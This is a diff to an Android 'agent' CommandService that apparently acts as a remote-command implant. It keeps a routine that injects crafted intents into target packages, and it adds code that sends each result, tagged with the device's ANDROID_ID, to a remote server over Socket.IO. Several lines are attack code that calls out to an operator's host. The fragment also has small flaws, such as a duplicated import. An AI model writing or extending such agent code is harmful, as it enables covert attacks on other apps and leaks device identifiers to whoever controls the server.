@@ -1,10 +1,25 @@
 package com.mobilemorph.agent.services;
-
+import android.app.Service;
+import android.content.Intent;
+import android.content.Context;
+import android.content.ComponentName;
+import android.content.SharedPreferences;
+import android.os.IBinder;
+import android.os.Build;
+import android.provider.Settings;
+import android.util.Log;
+import org.json.JSONObject;
+import java.util.Iterator;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+// Include your custom utility classes if available
+import com.mobilemorph.agent.utils.*;
+import io.socket.client.IO;
+import io.socket.client.Socket;
+import org.json.JSONObject;
 
 public class CommandService extends Service {
     private static final String TAG = "CommandService";
@@ -199,11 +214,29 @@ public class CommandService extends Service {
                 }
             }
 
-            context.sendBroadcast(intent);
+            getApplicationContext().sendBroadcast(intent);
             sendResult("Intent injection sent to: " + pkg + component);
         } catch (Exception e) {
             sendResult("Error during intent injection: " + e.getMessage());
         }
+    }
+
+    private String getDeviceId() {
+        return android.provider.Settings.Secure.getString(
+            getApplicationContext().getContentResolver(),
+            android.provider.Settings.Secure.ANDROID_ID
+        );
+    }
+
+    private void sendResult(String message) {
+        try {
+		    JSONObject result = new JSONObject();
+		    result.put("device_id", getDeviceId());
+		    result.put("result", message);
+		    mSocket.emit("command_result", result);
+	    } catch (Exception e) {
+		    e.printStackTrace();
+	    }
     }
 
     @Override
